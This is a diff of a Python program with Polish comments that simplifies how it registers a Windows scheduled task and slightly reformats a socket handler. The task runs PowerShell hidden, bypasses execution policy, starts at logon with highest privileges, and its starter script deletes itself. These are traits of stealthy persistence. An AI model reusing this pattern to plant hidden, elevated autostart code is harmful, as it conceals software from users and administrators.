@@ -135,15 +135,14 @@ Remove-Item -Path "{starter_script_path}" -Force -ErrorAction SilentlyContinue
 
         task_command = f'powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "{starter_script_path}"'
 
-        base_schtasks_command = ['schtasks', '/Create', '/TN', task_name, '/TR', task_command, '/F']
-
-        if trigger_type == 'onlogon':
-            final_schtasks_command = base_schtasks_command + ['/SC', 'ONLOGON', '/DELAY', '0001:00', '/RL', 'HIGHEST']
-        else:
-            final_schtasks_command = base_schtasks_command + ['/SC', 'ONLOGON', '/DELAY', '0001:00', '/RL', 'HIGHEST']
+        # Uproszczona logika budowania polecenia - bez duplikacji
+        schtasks_command = [
+            'schtasks', '/Create', '/TN', task_name, '/TR', task_command, '/F',
+            '/SC', 'ONLOGON', '/DELAY', '0001:00', '/RL', 'HIGHEST'
+        ]
 
         result = subprocess.run(
-            final_schtasks_command,
+            schtasks_command,
             capture_output=True, text=True, encoding='cp852', errors='ignore',
             creationflags=subprocess.CREATE_NO_WINDOW
         )
@@ -172,7 +171,6 @@ def handle_client(conn, addr):
             if not chunk: raise RuntimeError("Połączenie przerwane")
             chunks.append(chunk)
             bytes_recd += len(chunk)
-
         data = json.loads(b''.join(chunks).decode('utf-8'))
 
         if not IPC_TOKEN:
